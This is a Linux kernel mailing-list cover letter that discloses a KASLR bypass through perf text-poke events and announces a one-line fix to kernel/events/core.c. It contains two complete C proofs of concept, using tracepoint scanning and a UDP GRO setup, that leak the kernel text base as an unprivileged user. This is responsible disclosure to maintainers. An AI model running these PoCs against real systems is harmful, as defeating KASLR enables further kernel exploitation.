Received: from mail-dy2-f37.google.com (mail-dy2-f37.google.com [74.125.229.37])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 28FF22D2381
	for <linux-perf-users@vger.kernel.org>; Mon, 28 Sep 2026 18:00:14 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.37
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790618416; cv=none; b=FbURS3TIuysC2snZ0caaO34M2CETTfq3sTT2N5lOYpYhtJ2rX92tkgntRH9wL3XH9q2UVXgV53PCC73lhEXr3cgnZclxFF15rf2W4VKiD3A/8Bt0iwCymLiAb9XANdDpjMSmo5ynlEqiZUQMwkm0p/D5Ep8SkMhMIl/axbHA1jo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790618416; c=relaxed/simple;
	bh=ZtXJjE7O82uODsx5ollZevkgrVgethQqGXY3Gal0v04=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=uPrtwhDY+K81Jyani0xXFIIm52qO3dTnP02mqbAz3/opmAm01OzL4hN1VGkQVSFGIABm2Dr/y/vT1vVFcHV92pmjGiUxPtaE7pSr79inIa3MEmUqEJS6++4xIMqThaKvXXCtE88QCfy6c7L9xpi/7OKIN/WPUWyN+MDpYGuMGT0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=JK5BD8/H; arc=none smtp.client-ip=74.125.229.37
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="JK5BD8/H"
Received: by mail-dy2-f37.google.com with SMTP id 5a478bee46e88-346c612c7a8so1125964eec.1
        for <linux-perf-users@vger.kernel.org>; Mon, 28 Sep 2026 11:00:14 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1790618414; x=1791223214; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=f1iGcS8vbmWZgAaSLUVrOCsYXTDsBbHQFZliERpe3lA=;
        b=JK5BD8/HWc85LZ6qBiQBmwKGpHiqxFdfQzRIoqwjufG8ouMP8uJrvkhYgiGY1347KN
         l3k24Aihnrv6D72sLQ/s8ah416ehEbO8ie8KofvHRYG9HPTEbl8zIrf4AIbfLEE8tWxu
         4xRGiZUxKGWBnudKexLIVuaG51DdkS2SjpNKK3uIysD9o/5l9wL1T+37G20wox0ZIhNy
         Ydr8dCsBZwQAw3KqXxCFa3lf9/yK26wlezavrcPHYyioC8Tswpg9gbqEWhtTv+eMN8Pd
         YWNSrycaorZ2KSoRvIFueBkNo3BLjAAddj7j2xughWjzPftVRwnYFPJxfggQ6oNb5JP8
         najg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790618414; x=1791223214;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=f1iGcS8vbmWZgAaSLUVrOCsYXTDsBbHQFZliERpe3lA=;
        b=wLY7DVBBP+9pxPPy06GHTEkrYw4GkGCepWiOF090lZRyB0/fpGz7wEPQUqzvfcPS1o
         Eblq/LV2EaeE8zfwBwsJWhyVwBzavcAlSmiZDhNQuRBUW/MYC8jKSwpZArCAaPFO1V1O
         9p8ClzPFJ/lozfMbMJjPClLBcToY41+dECBfKKb0vPiIB4vgfbjdV2SlTJJHXAVSo6SC
         ZLluMMGBs4swsoFqV0SHI1q9Y6yYILkkpon0Cw8vYYTy1XoG4EmyInzBUd6/TX7R8rd2
         4l13OCYn5GhSLyEmy69NooZ0QqrQtJtSlJVW7Y51Stq8VepLIcWpN+r9Dsf08Np1WKbB
         UWKg==
X-Forwarded-Encrypted: i=1; AKwUvBz4uQSP3OofVx57WDN62euRWy6YEeyesaLxpxiaukntdDpvhTn0n0ymW3ps84Si3IlxbkJIyaOXNhurjbBw1Sn2@vger.kernel.org
X-Gm-Message-State: AFq9FYJ4308xcsromONnMHJH6ipqMAK/jjn/N6pvJJwawPU5swXQc6Lp
	SQJn/vPf75z4cifVnVfuAL0+1xa33CYGiKvTESVqmaJz3ZVcs97BiyoE
X-Gm-Gg: AYBFou0zVME5ibiqOjq/wVavMc34AxOTn905ZXJAlcM0QPyjTDIJ/RC+zH67GqOqYvN
	FSlxPdkZLhCNHkvU9ri8BsshW0wQEhJL5yR3OlZY63Ym5EI6XOXoWWZ3uquucGS6Sbh1LWghTCT
	Hcqomae2vMlM/KElc0gkTbPma+QJDMy6OUaV7Yaih/SSEPd5fmaccrr+ZH5OaN8sKvUrHPuFbU4
	ifX++eu1131fiJxtX4HxsE5eBuUP4YvRwKUJoGAGnkBNWqDE0Q4MQCT6VyCw/F2IDmDi5fCuHwX
	BYk68gKXmzOyNMxJDnBzzPVJvUC1PRkqTRHoShlPkP0JonPrAn/g4RYCH2wqxQ8d4DWR/OPSrvX
	q/fWToadcGUqQ1TAnSp2v+BvhQoFqMl96zVHSOWHCHD1ZJJ4bUOZXAztFY+c6TjmZyj9UCYMcwp
	DekqARYhUFSqF23iDchyF+g1bigBShxUUHOLJcEwPJBG+1ojTsdIomzPJnP7i1dKUDD+dVvyRdF
	zyfk/Vu
X-Received: by 2002:a05:693c:26cc:b0:33f:45d1:8f24 with SMTP id 5a478bee46e88-3427246b702mr9847658eec.22.1790618413927;
        Mon, 28 Sep 2026 11:00:13 -0700 (PDT)
Received: from kq.cs.ucr.edu (kq.cs.ucr.edu. [169.235.27.223])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-34144b4ae50sm29808542eec.17.2026.09.28.11.00.13
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 28 Sep 2026 11:00:13 -0700 (PDT)
From: Zhengchuan Liang <zcliangcn@gmail.com>
To: Peter Zijlstra <peterz@infradead.org>
Cc: Ingo Molnar <mingo@redhat.com>,
	Arnaldo Carvalho de Melo <acme@kernel.org>,
	Namhyung Kim <namhyung@kernel.org>,
	Mark Rutland <mark.rutland@arm.com>,
	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
	Jiri Olsa <jolsa@kernel.org>,
	Ian Rogers <irogers@google.com>,
	Adrian Hunter <adrian.hunter@intel.com>,
	James Clark <james.clark@linaro.org>,
	linux-perf-users@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Zhengchuan Liang <zcliangcn@gmail.com>
Subject: [PATCH 0/1] perf/core: Text-poke events expose the kernel text base
Date: Mon, 28 Sep 2026 10:59:34 -0700
Message-Id: <cover.1790573390.git.zcliangcn@gmail.com>
X-Mailer: git-send-email 2.25.1
Precedence: bulk
X-Mailing-List: linux-perf-users@vger.kernel.org
List-Id: <linux-perf-users.vger.kernel.org>
List-Subscribe: <mailto:linux-perf-users+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-perf-users+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi,

I found and validated a kernel address disclosure through perf's
text-poke sideband. At the upstream default perf_event_paranoid=2, an
unprivileged user can open a task-local PERF_COUNT_SW_DUMMY event with
exclude_kernel=1 and text_poke=1, then mmap its ring buffer.
PERF_RECORD_TEXT_POKE records contain raw relocated kernel instruction
addresses, revealing the runtime kernel text base for a known image
despite KASLR.

A disabled, count-only PERF_TYPE_TRACEPOINT event can trigger the leak:
registering its first perf consumer updates an inline static call, and the
observer receives the resulting text-poke record. Numeric tracepoint IDs
can be scanned without tracefs access. A UDP GRO static-call update
independently triggers the same disclosure, so restricting tracepoint
registration would leave the underlying leak open.

The first minimized x86_64 PoC scans tracepoint IDs instead of assuming
a fixed ID. Run both PoCs as an unprivileged user with
perf_event_paranoid=2.

------BEGIN poc1------

  #define _GNU_SOURCE
  #include <linux/perf_event.h>
  #include <stdint.h>
  #include <stdio.h>
  #include <sys/mman.h>
  #include <sys/syscall.h>
  #include <unistd.h>

  #define DATA_PAGES 8
  #define MAX_ID 65535

  struct text_poke {
          struct perf_event_header header;
          uint64_t addr;
          uint16_t old_len;
          uint16_t new_len;
  };

  static int perf_open(uint32_t type, uint64_t config, int disabled,
                       int text_poke)
  {
          struct perf_event_attr attr = {
                  .type = type,
                  .size = sizeof(attr),
                  .config = config,
                  .sample_period = text_poke,
                  .wakeup_events = 1,
                  .disabled = disabled,
                  .exclude_kernel = 1,
                  .text_poke = text_poke,
          };

          return syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
  }

  int main(void)
  {
          long page_size = sysconf(_SC_PAGESIZE);
          struct perf_event_mmap_page *meta;
          unsigned char *data;
          uint64_t head, tail;
          unsigned int id;
          int observer;

          observer = perf_open(PERF_TYPE_SOFTWARE,
                               PERF_COUNT_SW_DUMMY, 0, 1);
          if (observer < 0) {
                  perror("observer perf_event_open");
                  return 1;
          }
          meta = mmap(NULL, (DATA_PAGES + 1) * page_size,
                      PROT_READ | PROT_WRITE, MAP_SHARED, observer, 0);
          if (meta == MAP_FAILED) {
                  perror("mmap");
                  return 1;
          }
          data = (unsigned char *)meta + page_size;

          for (id = 1; id <= MAX_ID; id++) {
                  uint64_t before = __atomic_load_n(&meta->data_head,
                                                    __ATOMIC_ACQUIRE);
                  int trigger = perf_open(PERF_TYPE_TRACEPOINT,
                                          id, 1, 0);

                  if (trigger < 0)
                          continue;
                  head = __atomic_load_n(&meta->data_head,
                                         __ATOMIC_ACQUIRE);
                  if (head != before)
                          break;
                  close(trigger);
          }
          if (id > MAX_ID)
                  return 2;

          tail = meta->data_tail;
          while (tail < head) {
                  struct text_poke *record = (void *)(data +
                          (tail & (meta->data_size - 1)));

                  if (record->header.type == PERF_RECORD_TEXT_POKE) {
                          printf("id=%u text_poke_address=%#llx\n", id,
                                 (unsigned long long)record->addr);
                          return 0;
                  }
                  tail += record->header.size;
          }
          return 3;
  }

------END poc1------

The second PoC triggers a static-call update by configuring UDP GRO and
ESP-in-UDP on an IPv4 UDP socket.

------BEGIN poc2------

  #define _GNU_SOURCE
  #include <linux/perf_event.h>
  #include <linux/udp.h>
  #include <netinet/in.h>
  #include <stdint.h>
  #include <stdio.h>
  #include <sys/mman.h>
  #include <sys/socket.h>
  #include <sys/syscall.h>
  #include <unistd.h>

  #define DATA_PAGES 8

  struct text_poke {
          struct perf_event_header header;
          uint64_t addr;
          uint16_t old_len;
          uint16_t new_len;
  };

  int main(void)
  {
          struct perf_event_attr attr = {
                  .type = PERF_TYPE_SOFTWARE,
                  .size = sizeof(attr),
                  .config = PERF_COUNT_SW_DUMMY,
                  .sample_period = 1,
                  .wakeup_events = 1,
                  .exclude_kernel = 1,
                  .text_poke = 1,
          };
          long page_size = sysconf(_SC_PAGESIZE);
          struct perf_event_mmap_page *meta;
          unsigned char *data;
          uint64_t head, tail;
          int one = 1, encap = UDP_ENCAP_ESPINUDP;
          int observer, sock;

          observer = syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
          if (observer < 0) {
                  perror("observer perf_event_open");
                  return 1;
          }
          meta = mmap(NULL, (DATA_PAGES + 1) * page_size,
                      PROT_READ | PROT_WRITE, MAP_SHARED, observer, 0);
          if (meta == MAP_FAILED) {
                  perror("mmap");
                  return 1;
          }
          data = (unsigned char *)meta + page_size;

          sock = socket(AF_INET, SOCK_DGRAM, 0);
          if (sock < 0 ||
              setsockopt(sock, IPPROTO_UDP, UDP_GRO, &one, sizeof(one)) ||
              setsockopt(sock, IPPROTO_UDP, UDP_ENCAP,
                         &encap, sizeof(encap))) {
                  perror("UDP setup");
                  return 1;
          }

          head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
          tail = meta->data_tail;
          while (tail < head) {
                  struct text_poke *record = (void *)(data +
                          (tail & (meta->data_size - 1)));

                  if (record->header.type == PERF_RECORD_TEXT_POKE) {
                          printf("text_poke_address=%#llx\n",
                                 (unsigned long long)record->addr);
                          return 0;
                  }
                  tail += record->header.size;
          }
          return 2;
  }

------END poc2------

I reproduced the leak through both triggers as an unprivileged user on a
kernel built from Torvalds' v7.3-rc5.

Zhengchuan Liang (1):
  perf/core: Require kernel access for text poke events

 kernel/events/core.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.34.1
